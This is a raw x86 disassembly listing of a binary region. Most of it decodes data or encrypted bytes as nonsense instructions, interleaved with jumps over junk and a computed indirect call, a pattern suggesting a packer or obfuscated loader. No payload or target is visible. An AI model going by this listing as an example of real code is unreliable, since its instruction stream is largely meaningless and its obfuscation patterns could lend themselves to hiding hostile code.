  41bf56:	mov    edx,0x78e0badd
  41bf5b:	mov    al,ds:0x78279159
  41bf60:	cmp    DWORD PTR [edx-0x3fe33656],ebp
  41bf66:	in     al,dx
  41bf67:	mul    DWORD PTR ds:0xce10bacf
  41bf6d:	push   cs
  41bf6e:	shl    DWORD PTR [ebx+0x4b],0x93
  41bf72:	data16 cmp dl,BYTE PTR [edi-0x48f0a19]
  41bf79:	push   esp
  41bf7a:	call   FWORD PTR [esi-0x7c]
  41bf7d:	adc    edx,DWORD PTR [esi-0x42]
  41bf80:	dec    ebp
  41bf81:	mov    edx,0x1686dff3
  41bf86:	in     eax,0x11
  41bf88:	mov    bl,0x36
  41bf8a:	or     bh,al
  41bf8c:	cmp    DWORD PTR [ecx-0x63f6be30],eax
  41bf92:	cs jmp 0x23ec:0x2ec225a0
  41bf9a:	sbb    esp,DWORD PTR [ebx+eiz*4+0x3a27a1f0]
  41bfa1:	sbb    al,0x3b
  41bfa3:	nop
  41bfa4:	das    
  41bfa5:	(bad)  
  41bfa6:	(bad)  
  41bfa7:	dec    edx
  41bfa8:	les    esi,FWORD PTR [edi-0x799f8a03]
  41bfae:	cmp    eax,0xd33f867a
  41bfb3:	xchg   edx,eax
  41bfb5:	pop    es
  41bfb6:	jb     0x41c01b
  41bfb8:	sbb    DWORD PTR [edx],0xffffffed
  41bfbb:	fcom   QWORD PTR [edi]
  41bfbd:	out    0xd7,al
  41bfbf:	jge    0x72d9ca51
  41bfc5:	xor    al,BYTE PTR [eax]
  41bfc7:	cmp    ecx,eax
  41bfc9:	jne    0x41b45c
  41bfcf:	mov    ebx,esi
  41bfd1:	jmp    0x41bfdb
  41bfd6:	mov    ebx,0x327298
  41bfdb:	mov    eax,DWORD PTR [ebp-0x4]
  41bfde:	jmp    0x41c213
  41bfe3:	mov    edi,0xc5c6c0c6
  41bfe9:	(bad)
  41bfec:	xlat   BYTE PTR ds:[ebx]
  41bfed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfee:	inc    edx
  41bfef:	dec    esp
  41bff0:	xor    eax,0xe8b8cc13
  41bff5:	jg     0x41c06f
  41bff7:	adc    BYTE PTR [esi+0x78],bh
  41bffa:	js     0x41c020
  41bffc:	lea    esi,[ebx-0x4dcdca9e]
  41c002:	aam    0x65
  41c004:	mov    bh,BYTE PTR [ecx-0x5bcd1040]
  41c00a:	inc    edi
  41c00b:	mov    ecx,0x40fd1a8c
  41c011:	mov    ah,0x80
  41c013:	dec    edi
  41c014:	(bad)  
  41c016:	mov    bx,0xb02d
  41c01a:	daa    
  41c01b:	ret    
  41c01c:	dec    eax
  41c01d:	or     ebx,DWORD PTR [edi]
  41c01f:	sub    DWORD PTR [ecx],ecx
  41c021:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c022:	adc    BYTE PTR [edi+0x78057eb2],ch
  41c028:	mov    bl,0xa1
  41c02a:	sbb    ebp,DWORD PTR [esi+0x4f88829c]
  41c030:	pop    edi
  41c031:	fisub  DWORD PTR [edi+0x9]
  41c034:	add    dh,0x21
  41c037:	(bad)  
  41c038:	(bad)  
  41c039:	out    0x6f,eax
  41c03b:	xor    dl,BYTE PTR [ecx]
  41c03d:	xchg   ebx,esp
  41c03f:	sbb    DWORD PTR [ebp-0x7a],eax
  41c042:	js     0x41bff9
  41c044:	sbb    si,WORD PTR [esi+0x7b91b3ad]
  41c04b:	aaa    
  41c04c:	outs   dx,DWORD PTR ds:[esi]
  41c04d:	mov    bl,bl
  41c04f:	les    eax,FWORD PTR [ebx]
  41c051:	sbb    al,0xe2
  41c053:	mov    ebp,0xedfb6573
  41c058:	out    0x43,al
  41c05a:	shl    BYTE PTR [eax+0x28],1
  41c05d:	ja     0x41c01b
  41c05f:	cdq    
  41c060:	inc    ebx
  41c061:	add    DWORD PTR [ecx],ebp
  41c063:	mov    bl,BYTE PTR [ecx+0x79a888eb]
  41c069:	mov    edi,0xd0e3b8e1
  41c06e:	or     dl,BYTE PTR [esi+0x77fc1ce]
  41c074:	shl    BYTE PTR [ebp-0x6f533bcb],0xd
  41c07b:	cmp    edx,DWORD PTR [esi-0x29]
  41c07e:	xchg   ecx,eax
  41c07f:	pop    edx
  41c080:	(bad)  
  41c081:	js     0x41c067
  41c083:	lahf   
  41c084:	and    eax,0xbf4f590d
  41c089:	jno    0x41c0c6
  41c08b:	out    dx,eax
  41c08c:	sbb    DWORD PTR [ebp+0x49b104c5],eax
  41c092:	pushf  
  41c093:	inc    edx
  41c094:	aaa    
  41c095:	clc    
  41c096:	mov    ah,0x7f
  41c098:	out    dx,al
  41c099:	jmp    0x808debe9
  41c09e:	xor    DWORD PTR [edi-0xd395858],edi
  41c0a4:	mov    al,0x7e
  41c0a6:	or     al,0x26
  41c0a8:	inc    ebx
  41c0a9:	(bad)  
  41c0ac:	inc    ecx
  41c0ad:	clc    
  41c0ae:	daa    
  41c0af:	xor    ebx,esp
  41c0b1:	int3   
  41c0b2:	mov    esi,0xd24ea7a3
  41c0b7:	mul    DWORD PTR [esi+0x9]
  41c0ba:	ror    esp,1
  41c0bc:	or     ebp,DWORD PTR [edi]
  41c0be:	shl    BYTE PTR [edi-0x73],0x27
  41c0c2:	inc    edi
  41c0c3:	jbe    0x41c10d
  41c0c5:	pop    ds
  41c0c6:	loop   0x41c0be
  41c0c8:	sbb    eax,0xf7e4bd24
  41c0cd:	stos   DWORD PTR es:[edi],eax
  41c0ce:	shl    DWORD PTR [ecx],cl
  41c0d0:	jmp    0x2a9b:0x1c3e9fcd
  41c0d7:	ins    DWORD PTR es:[edi],dx
  41c0d8:	mov    ecx,DWORD PTR [eax-0x10]
  41c0db:	inc    edx
  41c0dc:	imul   ebx,DWORD PTR [eax],0x58
  41c0df:	ret    
  41c0e0:	jo     0x41c0c7
  41c0e2:	fistp  QWORD PTR [eax+0x980419e]
  41c0e8:	dec    edx
  41c0e9:	fucomip st,st(4)
  41c0eb:	imul   esi,DWORD PTR [edx],0xb
  41c0ee:	ror    al,1
  41c0f0:	fmul   QWORD PTR [esi]
  41c0f2:	inc    ebx
  41c0f3:	inc    ebp
  41c0f4:	je     0x41c112
  41c0f6:	fdivr  DWORD PTR [edx+0x77]
  41c0f9:	mov    ebx,0x73ec01d9
  41c0fe:	scas   al,BYTE PTR es:[edi]
  41c0ff:	dec    edx
  41c100:	setge  BYTE PTR [eax]
  41c103:	mov    esp,0x551d1b62
  41c108:	pop    ebx
  41c109:	js     0x41c0fb
  41c10b:	mov    ebx,0x43515300
  41c110:	scas   al,BYTE PTR es:[edi]
  41c111:	push   0x9d5c77af
  41c116:	or     eax,0x9e6be368
  41c11b:	mov    dl,0x12
  41c11d:	inc    ebx
  41c11e:	mov    ebx,0xe6082230
  41c123:	and    dl,BYTE PTR [eax]
  41c125:	aaa    
  41c126:	jmp    0x41c0b1
  41c128:	push   cs
  41c129:	repz push edi
  41c12b:	cwde   
  41c12c:	adc    eax,0xba7b351b
  41c131:	popf   
  41c132:	mov    DWORD PTR [ecx-0x3b53246b],ecx
  41c138:	adc    eax,DWORD PTR ds:0x8e3a7ae
  41c13e:	(bad)  
  41c13f:	ja     0x41c14d
  41c141:	xor    BYTE PTR [esi+0x3f8d13f2],ch
  41c147:	sbb    al,0xb8
  41c149:	loop   0x41c141
  41c14b:	push   ss
  41c14c:	mov    ebx,0xaf84699
  41c151:	aad    0x33
  41c153:	in     eax,0x6c
  41c155:	stos   BYTE PTR es:[edi],al
  41c156:	loop   0x41c17a
  41c158:	xchg   ebx,eax
  41c159:	cmp    al,0x63
  41c15b:	adc    edi,DWORD PTR [ecx-0x55]
  41c15e:	ret    0xb0f2
  41c161:	test   al,0x81
  41c163:	loope  0x41c10a
  41c165:	jo     0x41c146
  41c167:	jecxz  0x41c1ad
  41c169:	pusha  
  41c16a:	cmp    dh,BYTE PTR [ebp+0x6611468]
  41c170:	jmp    0x41c175
  41c172:	int    0x58
  41c174:	mov    eax,0x8682b7c
  41c179:	aas    
  41c17a:	mov    ebx,edx
  41c17c:	idiv   BYTE PTR [ecx-0x881dd93]
  41c182:	mov    ds,WORD PTR [ebx]
  41c184:	addr16 (bad) 
  41c186:	neg    DWORD PTR [edx+0x7b1933b4]
  41c18c:	xor    bh,BYTE PTR [eax+0x61761c81]
  41c192:	dec    ebx
  41c193:	out    0xfc,al
  41c195:	aam    0xfc
  41c197:	adc    DWORD PTR [eax-0x2b],0xbc4630cf
  41c19e:	xchg   ebp,eax
  41c19f:	cli    
  41c1a0:	fsub   DWORD PTR [eax+0x9c042ee]
  41c1a6:	mov    al,0xd5
  41c1a8:	dec    edx
  41c1a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1aa:	jo     0x41c16f
  41c1ac:	scas   eax,DWORD PTR es:[edi]
  41c1ad:	in     al,0x2b
  41c1af:	inc    ebp
  41c1b0:	adc    DWORD PTR [edi+ebx*4-0x3a],edi
  41c1b4:	pop    esi
  41c1b5:	adc    eax,0x7712a542
  41c1ba:	xor    DWORD PTR [ecx],0x5a
  41c1bd:	fdivr  QWORD PTR [edx+0x2c]
  41c1c0:	jp     0x41c153
  41c1c2:	jae    0x41c1fa
  41c1c4:	fist   DWORD PTR [ecx-0x2f]
  41c1c7:	cmp    ecx,DWORD PTR [edx+0x42]
  41c1ca:	mov    eax,0x101743f6
  41c1cf:	inc    ecx
  41c1d0:	sbb    al,0x64
  41c1d2:	lds    esp,FWORD PTR [ecx]
  41c1d4:	out    dx,eax
  41c1d5:	mov    esi,0x2bdd7fbf
  41c1da:	mov    ah,0x2a
  41c1dc:	jae    0x41c1a0
  41c1de:	sub    al,0x3d
  41c1e0:	mov    ds:0x83d543ec,al
  41c1e5:	and    DWORD PTR [ebp-0x3f],esp
  41c1e8:	or     eax,0xd72d00b8
  41c1ed:	(bad)
  41c1f1:	inc    eax
  41c1f2:	sub    bh,bh
  41c1f4:	jne    0x41c201
  41c1f6:	fnsetpm(287 only) 
  41c1f8:	cmp    eax,0xcfb55e9b
  41c1fd:	mov    ds:0xdb8e7545,eax
  41c202:	sub    al,0x22
  41c204:	push   edi
  41c205:	pop    ebx
  41c206:	mov    ecx,cs
  41c208:	xlat   BYTE PTR ds:[ebx]
  41c209:	jge    0x41c258
  41c20b:	inc    DWORD PTR [esi+0x13443f27]
  41c211:	outs   dx,DWORD PTR ds:[esi]
  41c212:	inc    edi
  41c213:	xor    eax,0x7510850
  41c218:	add    eax,ebx
  41c21a:	jmp    0x41c44f
  41c21f:	cmp    al,0xc7
  41c221:	(bad)
  41c224:	rol    esp,0xc5
  41c227:	jb     0x41c1ac
  41c229:	dec    ebx
  41c22a:	pop    ebx
  41c22b:	sub    esp,0x55
  41c22e:	adc    eax,0x787fee50
  41c233:	adc    BYTE PTR [esi+0x78],bh
  41c236:	js     0x41c1e9
  41c238:	std    
  41c239:	retf   
  41c23a:	mov    es,WORD PTR [edx]
  41c23c:	es ret 
  41c23e:	repz aad 0xa7
  41c241:	dec    edi
  41c242:	adc    ecx,edx
  41c244:	adc    BYTE PTR [edi],bh
  41c246:	scas   eax,DWORD PTR es:[edi]
  41c247:	sub    eax,0x5846c44f
  41c24c:	imul   edi,DWORD PTR [ebx],0x51
  41c24f:	xor    al,BYTE PTR [ebx+0x41719250]
  41c255:	push   cs
  41c256:	or     ecx,DWORD PTR [ecx+0x538c6816]
  41c25c:	dec    ebp
  41c25d:	ja     0x41c2c8
  41c25f:	jmp    0xe0bb4b0d
  41c264:	and    edi,DWORD PTR [ebx+0x3ab153ef]
  41c26a:	arpl   WORD PTR [esi-0x7bdad3c8],bx
  41c270:	sbb    eax,0x76f85218
  41c275:	sub    ch,bl
  41c277:	in     al,0x31
  41c279:	or     BYTE PTR [edx+0x79],ah
  41c27c:	push   ecx
  41c27d:	sub    edx,DWORD PTR [edi]
  41c27f:	mov    dl,0xf1
  41c281:	adc    DWORD PTR [eax+0x56e28c9b],edi
  41c287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c288:	daa    
  41c289:	or     esp,DWORD PTR [ebp+0x1e58c336]
  41c28f:	rol    al,0x2
  41c292:	loopne 0x41c241
  41c294:	popa   
  41c295:	scas   eax,DWORD PTR es:[edi]
  41c296:	das    
  41c297:	pop    ebp
  41c298:	pop    ss
  41c299:	ins    BYTE PTR es:[edi],dx
  41c29a:	sbb    al,0x21
  41c29c:	pop    edi
  41c29d:	pop    esp
  41c29e:	dec    esp
  41c29f:	ror    BYTE PTR [esi+eiz*2-0x37],0xe1
  41c2a4:	sbb    BYTE PTR [ebp+esi*4-0x15],ah
  41c2a8:	lods   al,BYTE PTR ds:[esi]
  41c2a9:	inc    ecx
  41c2aa:	cmp    DWORD PTR [eax+ebp*2-0x5cf36f8f],edx
  41c2b1:	inc    ecx
  41c2b2:	pop    ebx
  41c2b3:	stc    
  41c2b4:	int3   
  41c2b5:	cmp    eax,esi
  41c2b7:	pop    esp
  41c2b8:	cmp    eax,0x25317a03
  41c2bd:	bnd je 0x41c32e
  41c2c0:	xor    al,0x7a
  41c2c2:	inc    edx
  41c2c3:	mov    bl,0x32
  41c2c5:	imul   ebx,DWORD PTR [eax-0x77],0xffffffd8
  41c2c9:	jecxz  0x41c265
  41c2cb:	ins    DWORD PTR es:[edi],dx
  41c2cc:	pop    ecx
  41c2cd:	mov    WORD PTR [edi-0x228eb975],es
  41c2d3:	ror    WORD PTR [edx],0xe2
  41c2d7:	loope  0x41c25e
  41c2d9:	imul   esi,DWORD PTR [edi+0x15585318],0xd47ea6de
  41c2e3:	retf   0x37b0
  41c2e6:	push   esp
  41c2e7:	and    DWORD PTR [esi+0x64],esi
  41c2ea:	jne    0x41c2bb
  41c2ec:	jg     0x41c2f8
  41c2ee:	out    0x77,eax
  41c2f0:	arpl   WORD PTR [esi],ax
  41c2f2:	sbb    esp,DWORD PTR [edi+0x26]
  41c2f5:	pop    edi
  41c2f6:	pop    ecx
  41c2f7:	aad    0x51
  41c2f9:	ds dec esp
  41c2fb:	xchg   ebp,eax
  41c2fc:	xor    esi,esp
  41c2fe:	dec    esi
  41c2ff:	sti    
  41c300:	or     dh,BYTE PTR [edi+0x36]
  41c303:	ds mov dh,0x41
  41c306:	xchg   edi,eax
  41c307:	hlt    
  41c308:	jmp    0x12f1a8aa
  41c30d:	fs push 0x55
  41c310:	jb     0x41c38d
  41c312:	test   BYTE PTR [eax],ch
  41c314:	dec    edi
  41c315:	xor    ecx,DWORD PTR [ebp+0x5fc9f991]
  41c31b:	test   eax,0xf4baef1b
  41c320:	and    eax,DWORD PTR [esi-0x51]
  41c323:	test   BYTE PTR [edx],0xd9
  41c326:	push   ecx
  41c327:	(bad)  
  41c328:	shr    BYTE PTR [eax-0x44],1
  41c32b:	ja     0x41c356
  41c32d:	push   ebp
  41c32e:	dec    eax
  41c32f:	push   ebx
  41c330:	and    DWORD PTR [bp+si],edi
  41c333:	in     eax,dx
  41c334:	jb     0x41c350
  41c336:	mov    ah,0x22
  41c338:	add    edi,ecx
  41c33a:	xchg   esp,eax
  41c33b:	cmp    DWORD PTR [ecx+esi*2-0x7f68f093],esp
  41c342:	test   eax,0xb5fe06a3
  41c347:	arpl   cx,cx
  41c349:	pop    edx
  41c34a:	imul   eax,DWORD PTR [edx-0x6a],0xffffffd1
  41c34e:	repnz lods al,BYTE PTR ds:[esi]
  41c350:	loope  0x41c33f
  41c352:	in     al,0xe0
  41c354:	sub    ch,BYTE PTR [ecx-0x29]
  41c357:	retf   0x1b54
  41c35a:	or     cl,ah
  41c35c:	add    DWORD PTR [edx+esi*2],ecx
  41c35f:	dec    ebx
  41c360:	or     BYTE PTR [ecx-0x1d6e09b0],0x23
  41c367:	stos   DWORD PTR es:[edi],eax
  41c368:	xlat   BYTE PTR ds:[ebx]
  41c369:	dec    ecx
  41c36a:	jnp    0x41c396
  41c36c:	(bad)  
  41c36d:	into   
  41c36e:	iret   
  41c36f:	test   al,ah
  41c371:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c372:	and    dh,al
  41c374:	fbstp  TBYTE PTR [esi+0x6a559a84]
  41c37a:	mov    ds:0x1f67d794,eax
  41c37f:	inc    esi
  41c380:	daa    
  41c381:	mov    bh,0x93
  41c383:	adc    DWORD PTR [esi-0x3b61c734],eax
  41c389:	cmp    dl,cl
  41c38b:	pop    ebp
  41c38c:	es loope 0x41c3e4
  41c38f:	fs push ebp
  41c391:	shl    BYTE PTR [ecx+0x22832bfe],cl
  41c397:	mov    WORD PTR [ebx],ds
  41c399:	mov    DWORD PTR [edi+0x1f3c414a],0xf7cb56ff
  41c3a3:	pusha  
  41c3a4:	mov    ds:0xd2b9e648,eax
  41c3a9:	mov    eax,0x4ab91bb6
  41c3ae:	inc    ecx
  41c3af:	pop    eax
  41c3b0:	dec    edx
  41c3b1:	mov    ecx,0x45b1035c
  41c3b6:	mov    dl,0x3b
  41c3b8:	jne    0x41c432
  41c3ba:	or     eax,0xcb3a5856
  41c3bf:	pop    esp
  41c3c0:	xor    DWORD PTR [eax+0x417cbd7f],esp
  41c3c6:	and    al,0x56
  41c3c8:	mov    ah,al
  41c3ca:	bound  edi,QWORD PTR [edx-0x75]
  41c3cd:	push   edi
  41c3ce:	push   esp
  41c3cf:	mov    ch,0x92
  41c3d1:	imul   ebp,DWORD PTR [ecx+eax*8-0x728de9bb],0xd09ec43f
  41c3dc:	mov    ebx,0xfc716527
  41c3e1:	std    
  41c3e2:	je     0x41c416
  41c3e4:	dec    ebx
  41c3e5:	and    dl,cl
  41c3e7:	inc    ebp
  41c3e8:	test   al,0x2e
  41c3ea:	xchg   edi,eax
  41c3eb:	push   esi
  41c3ec:	repz frstor [eax]
  41c3ef:	xor    ah,bh
  41c3f1:	pop    ss
  41c3f2:	sub    BYTE PTR [esi+0x1fa2b384],bl
  41c3f8:	aaa    
  41c3f9:	cli    
  41c3fa:	xchg   esp,eax
  41c3fb:	clc    
  41c3fc:	sbb    bl,BYTE PTR [ecx+edx*2]
  41c3ff:	ds cld 
  41c401:	jo     0x41c47a
  41c403:	ja     0x41c41d
  41c405:	fild   WORD PTR [ebp-0x51]
  41c408:	cmp    eax,0x755dc015
  41c40d:	xchg   BYTE PTR ds:0x438c6eee,al
  41c413:	icebp  
  41c414:	adc    eax,DWORD PTR [edi-0x5d37dba9]
  41c41a:	icebp  
  41c41b:	mov    esp,0xd2518cf6
  41c420:	add    DWORD PTR [ebx-0x7f89ce8],edx
  41c426:	cwde   
  41c427:	sub    eax,DWORD PTR [eax]
  41c429:	pop    ebp
  41c42a:	lods   eax,DWORD PTR ds:[esi]
  41c42b:	jmp    0x641c:0x8e97d44f
  41c432:	fwait
  41c433:	add    al,0x87
  41c435:	jg     0x41c438
  41c437:	lahf   
  41c438:	mov    ds:0xf81d05e,al
  41c43d:	fld    st(1)
  41c43f:	ror    bl,cl
  41c441:	and    DWORD PTR [edi-0x10e09e17],ebx
  41c447:	(bad)  
  41c448:	jl     0x41c48f
  41c44a:	sbb    al,0x81
  41c44c:	aaa    
  41c44d:	adc    BYTE PTR [ebx],cl
  41c44f:	mov    DWORD PTR [ebp-0xc],eax
  41c452:	jmp    0x41c687
  41c457:	rol    dl,1
  41c459:	(bad)  
  41c45a:	enter  0xd6da,0xd4
  41c45e:	retf   0xb6a7
  41c461:	pop    eax
  41c462:	jp     0x41c4cd
  41c464:	fild   WORD PTR [eax+0x57]
  41c467:	push   0x10787fec
  41c46c:	jle    0x41c4e6
  41c46e:	js     0x41c40f
  41c470:	gs jmp 0x1565:0xa3a92069
  41c478:	inc    ebx
  41c479:	cmp    eax,0x281c15de
  41c47e:	mov    dl,0x71
  41c480:	and    eax,0xe9d804b2
  41c485:	mov    dl,0x57
  41c487:	inc    ecx
  41c488:	popf   
  41c489:	pop    edi
  41c48a:	cwde   
  41c48b:	popa   
  41c48c:	and    BYTE PTR [ebx-0x40d84bce],ch
  41c492:	aam    0xad
  41c494:	mov    dh,bh
  41c496:	in     al,0xca
  41c498:	jg     0x41c4ee
  41c49a:	or     al,BYTE PTR [eax+0x54ef4d88]
  41c4a0:	shl    DWORD PTR [ebp+0x32b0d45a],1
  41c4a6:	jb     0x41c480
  41c4a8:	pop    ss
  41c4a9:	push   0xffffffd9
  41c4ab:	ins    DWORD PTR es:[edi],dx
  41c4ac:	in     al,0xe7
  41c4ae:	ret    0xf84e
  41c4b1:	loope  0x41c519
  41c4b3:	dec    esp
  41c4b4:	leave  
  41c4b5:	xor    DWORD PTR [esp+ebp*2+0x4f],edi
  41c4b9:	xchg   esi,ebp
  41c4bb:	jmp    0x41c4c1
  41c4bd:	mov    bl,0x20
  41c4bf:	or     edx,DWORD PTR [ecx+0x46]
  41c4c2:	ret    0x845d
  41c4c5:	pop    ebx
  41c4c6:	rol    esp,cl
  41c4c8:	ss test esi,0xa31ed80a
  41c4cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4d0:	mov    al,0xeb
  41c4d2:	mov    dh,0xcb
  41c4d4:	add    ebp,DWORD PTR [ebx-0x63]
  41c4d7:	clc    
  41c4d8:	cmp    eax,0x3f72747c
  41c4dd:	and    DWORD PTR [edx],ebp
  41c4df:	retf   0x24a4
  41c4e2:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4e4:	sti    
  41c4e5:	dec    edx
  41c4e6:	sbb    esp,DWORD PTR [edx-0x65fb3b6a]
  41c4ec:	mov    eax,0x1d991bca
  41c4f1:	(bad)  [ebp+0x5e389d5f]
  41c4f7:	inc    esp
  41c4f8:	mov    ss,WORD PTR [ecx]
  41c4fa:	pop    esi
  41c4fb:	data16 test al,0xf2
  41c4fe:	xchg   esi,eax
  41c4ff:	cmp    eax,0x959190d8
  41c504:	jp     0x41c55b
  41c506:	outs   dx,BYTE PTR ds:[esi]
  41c507:	cmp    eax,0xa2816dda
  41c50c:	adc    esp,edi
  41c50e:	imul   ebx,DWORD PTR [esi-0x71c1092f],0x7c
  41c515:	mov    edi,0x22df723c
  41c51a:	js     0x41c52a
  41c51c:	xchg   ebx,eax
  41c51d:	mov    bl,0x52
  41c51f:	mov    eax,ebp
  41c521:	push   0xea5f1ed2
  41c526:	pop    ds
  41c527:	test   edi,ebx
  41c529:	mov    edi,0xdcecf696
  41c52e:	lds    eax,FWORD PTR ds:0x3084838b
  41c534:	test   DWORD PTR [esi+0x90c7205],esp
  41c53a:	pop    ss
  41c53b:	mov    esp,ebx
  41c53d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c53e:	(bad)  
  41c53f:	stos   DWORD PTR es:[edi],eax
  41c540:	sub    edi,DWORD PTR [esi-0xd6658b8]
  41c546:	xor    BYTE PTR [ecx-0x7f0167b9],0x37
  41c54d:	add    bl,BYTE PTR [eax-0x53]
  41c550:	lds    edi,FWORD PTR [ebx+0x68]
  41c553:	or     eax,0xa7eed0e1
  41c558:	mov    ebp,0xbdafca0b
  41c55d:	inc    eax
  41c55e:	inc    edx
  41c55f:	ja     0x41c56c
  41c561:	popa   
  41c562:	jecxz  0x41c595
  41c564:	cs xor al,0x40
  41c567:	or     bh,BYTE PTR [esi-0x325078f2]
  41c56d:	xchg   ecx,eax
  41c56e:	sub    DWORD PTR [ebx-0x4545b4f4],eax
  41c574:	es jb  0x41c59a
  41c577:	adc    al,0x8e
  41c579:	enter  0x28cf,0x7d
  41c57d:	mov    eax,0x8581c1bb
  41c582:	fwait
  41c583:	xchg   ecx,eax
  41c584:	dec    esi
  41c585:	dec    esi
  41c586:	sahf   
  41c587:	or     BYTE PTR [edx-0x68a03552],cl
  41c58d:	dec    eax
  41c58e:	add    edx,ecx
  41c590:	in     eax,dx
  41c591:	arpl   WORD PTR [edx],bp
  41c593:	push   ebp
  41c594:	add    DWORD PTR [edi+0x1412c72b],0x2a
  41c59b:	fist   WORD PTR [ebx]
  41c59d:	ds es mov ecx,0x2e0e005c
  41c5a4:	ja     0x41c618
  41c5a6:	adc    BYTE PTR [esi+eax*8+0x5d92a9b],dl
  41c5ad:	cs pop edx
  41c5af:	std    
  41c5b0:	jp     0x41c5ef
  41c5b2:	int    0x37
  41c5b4:	xor    BYTE PTR [ebx-0x7b8670fd],bl
  41c5ba:	scas   al,BYTE PTR es:[edi]
  41c5bb:	pop    ds
  41c5bc:	fcom   QWORD PTR [edx+0x1d6313ea]
  41c5c2:	xlat   BYTE PTR ds:[ebx]
  41c5c3:	push   eax
  41c5c4:	pop    ds
  41c5c5:	sub    al,0x25
  41c5c7:	sbb    cl,BYTE PTR [edi+0x6887e453]
  41c5cd:	sub    DWORD PTR [ebp+0x31],ebp
  41c5d0:	cwde   
  41c5d1:	sub    al,0xf3
  41c5d3:	jae    0x41c5d1
  41c5d5:	fmul   DWORD PTR [esi]
  41c5d7:	je     0x41c614
  41c5d9:	loopne 0x41c5ee
  41c5db:	inc    ebx
  41c5dc:	cdq    
  41c5dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5de:	cld    
  41c5df:	sub    ebx,DWORD PTR [ebx-0x27]
  41c5e2:	hlt    
  41c5e3:	jno    0x41c576
  41c5e5:	sar    BYTE PTR [ecx],0xa6
  41c5e8:	fnsave [edx-0x22eee7fe]
  41c5ee:	imul   esp,DWORD PTR [ebp+0x2],0x15e54361
  41c5f5:	repz clc 
  41c5f7:	and    bh,BYTE PTR [esi+edi*4+0x45525052]
  41c5fe:	daa    
  41c5ff:	ret    
  41c600:	dec    eax
  41c601:	sub    ebx,DWORD PTR [ebp-0x5a]
  41c604:	out    dx,al
  41c605:	mov    ecx,0x7960327a
  41c60a:	fwait
  41c60b:	cmp    al,0xc3
  41c60d:	or     al,0x9
  41c60f:	adc    ch,BYTE PTR [eax+0x39]
  41c612:	lods   al,BYTE PTR ds:[esi]
  41c613:	push   esi
  41c614:	pop    edi
  41c615:	bound  edi,QWORD PTR [edx]
  41c617:	ds scas eax,DWORD PTR es:[edi]
  41c619:	sbb    DWORD PTR [edx],ebp
  41c61b:	std    
  41c61c:	jmp    0x5463:0x71dc0dd2
  41c623:	aam    0x96
  41c625:	mov    ebp,0xe64b3ecc
  41c62a:	inc    ebx
  41c62b:	and    BYTE PTR [ecx],0xf0
  41c62e:	adc    edx,esi
  41c630:	mov    DWORD PTR [edi],esi
  41c632:	and    ch,bh
  41c634:	test   al,0xef
  41c636:	fs inc ecx
  41c638:	nop
  41c639:	and    bl,BYTE PTR [edx+eiz*8-0x43cc2c]
  41c640:	stc    
  41c641:	mov    esi,0x28dae099
  41c646:	in     eax,0x1f
  41c648:	pop    esi
  41c649:	pop    esp
  41c64a:	cwde   
  41c64b:	xchg   esp,eax
  41c64c:	adc    al,0xb7
  41c64e:	cmp    ecx,DWORD PTR [esi-0x52]
  41c651:	adc    eax,0x970de752
  41c656:	jbe    0x41c662
  41c658:	cmp    bl,BYTE PTR [eax]
  41c65a:	sub    DWORD PTR [esp+edi*2],edi
  41c65d:	jmp    0xeb5b:0xd401eaef
  41c664:	adc    eax,0xd1a7d979
  41c669:	and    eax,0x8be952fe
  41c66e:	and    eax,0xdee3da7b
  41c673:	pavgw  mm5,QWORD PTR [ecx]
  41c676:	loop   0x41c684
  41c678:	aaa    
  41c679:	test   al,0x1a
  41c67b:	mov    ss,WORD PTR [esi]
  41c67d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c67e:	xor    al,0x5b
  41c680:	test   eax,0x1c7e78b
  41c685:	adc    al,0x85
  41c687:	xor    ebx,ebx
  41c689:	lea    eax,[ebp-0x10]
  41c68c:	add    ebx,DWORD PTR [eax]
  41c68e:	call   ebx
  41c690:	xor    ebx,ebx
  41c692:	inc    ebx
  41c693:	cmp    DWORD PTR [ebp+0x10],ebx
  41c696:	je     0x41c6b4
  41c69c:	xchg   edx,eax
  41c69d:	push   0xa
  41c69f:	pop    ecx
  41c6a0:	push   0x4
  41c6a2:	pop    ebx
  41c6a3:	inc    ebx
  41c6a4:	xchg   ebx,ecx
  41c6a6:	sub    ebx,ecx
  41c6a8:	xchg   ebx,ecx
  41c6aa:	dec    ecx
  41c6ab:	mov    eax,DWORD PTR [ebp-0x1c]
  41c6ae:	imul   eax,ecx
  41c6b1:	add    esp,eax
  41c6b3:	xchg   edx,eax
  41c6b4:	push   eax
  41c6b5:	xor    ebx,ebx
  41c6b7:	mov    edx,esp
  41c6b9:	jmp    0x41c8ee
  41c6be:	mov    bh,0xc9
  41c6c1:	iret   
  41c6c2:	leave  
  41c6c3:	rcr    edx,1
  41c6c5:	aad    0x5d
  41c6c7:	mov    ds:0x4b00773e,eax
  41c6cc:	pop    ss
  41c6cd:	call   0x7e10:0x787ff100
  41c6d4:	js     0x41c74e
  41c6d6:	jnp    0x41c69b
  41c6d8:	sub    bh,BYTE PTR [ecx]
  41c6da:	push   0xffffffcf
  41c6dc:	jmp    0x2afb:0xf0e0838c
  41c6e3:	pop    ecx
  41c6e4:	imul   edx,edx,0x5770117
  41c6ea:	mov    ah,0xbf
  41c6ec:	mov    ebp,0x83104766
  41c6f1:	jnp    0x41c6e5
  41c6f3:	mov    ebp,0x40f8da9f
  41c6f8:	icebp  
  41c6f9:	mov    edx,0x6a7f9f4d
  41c6fe:	dec    ebx
  41c6ff:	dec    esp
  41c700:	and    DWORD PTR [ecx],edi
  41c702:	adc    esi,edi
  41c704:	sub    DWORD PTR [esi-0x69],ebp
  41c707:	xchg   DWORD PTR ds:0xc3af17cc,edx
  41c70d:	sbb    al,0x66
  41c70f:	imul   ebp,DWORD PTR [ebp+0x44],0xffffffe0
  41c713:	cs loopne 0x41c781
  41c716:	(bad)  [ebx+0x35]
  41c719:	arpl   bp,sp
  41c71b:	pop    ebx
  41c71c:	test   DWORD PTR [eax-0xc],0x8a55fbdb
